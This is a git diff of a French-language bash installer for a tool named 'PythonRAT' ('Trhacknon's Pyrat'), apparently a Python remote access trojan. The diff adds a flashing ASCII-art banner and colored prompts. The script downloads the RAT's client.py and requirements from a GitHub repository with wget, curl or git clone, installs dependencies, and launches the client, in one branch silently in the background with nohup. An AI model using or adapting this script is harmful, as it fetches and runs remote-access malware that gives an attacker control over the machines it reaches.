@@ -1,13 +1,37 @@
 #!/bin/bash
 
-# Fonction pour afficher la bannière colorée
-display_banner() {
-    echo -e "\e[0;31mTrhacknon's Pyrat\e[0m"
+# Fonction pour afficher la bannière avec effet de clignotement
+display_flashing_banner() {
+    colors=("31" "32" "33" "34" "35" "36" "31" "32" "33" "34" "35" "36" "31" "32" "33" "34" "35" "36")
+    for color in "${colors[@]}"; do
+        echo -e "\e[1;${color}m"
+        cat << "EOF"
+                 TRHACKNON
+        _        PythonRAT        _
+       |_|                       |_|
+       | |         /^^^\         | |
+      _| |_      (| "o" |)      _| |_
+    _| | | | _    (_---_)    _ | | | |_
+   | | | | |' |    _| |_    | `| | | | |
+   |          |   /     \   |          |
+    \        /  / /(. .)\ \  \        /
+      \    /  / /  | . |  \ \  \    /
+        \  \/ /    ||v||    \ \/  /
+         \__/      || ||      \__/
+                   () ()
+                   || ||
+                  ooO Ooo
+EOF
+        sleep 0.2
+        clear
+    done
 }
 
-# Fonction pour demander confirmation
+# Fonction pour demander confirmation avec couleur
 confirm() {
-    read -r -p "$1 [Y/n] " response
+    local prompt_color=$2
+    echo -e "$prompt_color$1 \n\e[1;33m[Y/n]\e[0m "
+    read -r response
     if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ || "$response" == "" ]]; then
         return 0
     else
@@ -15,35 +39,35 @@ confirm() {
     fi
 }
 
-# Afficher la bannière
-display_banner
+# Afficher la bannière avec effet de clignotement
+display_flashing_banner
 
 # Télécharger le client.py avec wget
-confirm "Voulez-vous télécharger client.py avec wget?" && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py
+confirm "\e[1;34mVoulez-vous télécharger client.py avec \e[1;35mwget" && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py
 
 # Vérifier si le téléchargement avec wget a réussi
 if [ $? -ne 0 ]; then
     # Essayer de télécharger avec curl
-    confirm "Le téléchargement avec wget a échoué. Voulez-vous essayer avec curl?" && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt
+    confirm "\e[1;34mLe téléchargement avec wget a échoué. Voulez-vous essayer avec \e[1;35mcurl" && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt
 fi
 
 # Vérifier si le téléchargement avec curl a réussi
 if [ $? -ne 0 ]; then
     # Cloner le repo en cas d'échec avec wget et curl
-    confirm "Le téléchargement avec curl a échoué. Voulez-vous cloner le repo avec git?" && git clone https://github.com/tucommenceapousser/PythonRAT
-    cd PythonRAT || exit
+    confirm "\e[1;34mLe téléchargement avec curl a échoué. Voulez-vous cloner le repo avec \e[1;35mgit" && git clone https://github.com/tucommenceapousser/PythonRAT && mv PythonRAT/src/client.py src/ && mv PythonRAT/src/requirements.txt src/ && rm -rf PythonRAT
+    cd ./ || exit
 
     # Vérifier si le répertoire "src" existe déjà
     if [ -d "src" ]; then
-        echo "Le répertoire 'src' existe déjà."
+        echo -e "\e[1;33mLe répertoire 'src' existe déjà.\e[0m"
     else
         # Créer le répertoire "src" s'il n'existe pas
         mkdir src
     fi
 
     # Lancer le client.py
-    confirm "Voulez-vous lancer client.py?" && python src/client.py
+    confirm "Voulez-vous lancer client.py?" "\e[1;35m" && python src/client.py
 else
     # Lancer le client.py téléchargé avec curl
-    confirm "Voulez-vous lancer client.py téléchargé avec curl?" && mkdir src && cp requirements.txt src/ && cp client.py src/ && pip install -r src/requirements.txt --force --use-feature=content-addressable-pool && nohup python src/client.py &
+    confirm "Voulez-vous lancer client.py téléchargé avec" "\e[1;34mcurl" && mkdir src && cp requirements.txt src/ && cp client.py src/ && pip install -r src/requirements.txt --force --use-feature=content-addressable-pool && nohup python src/client.py &
 fi
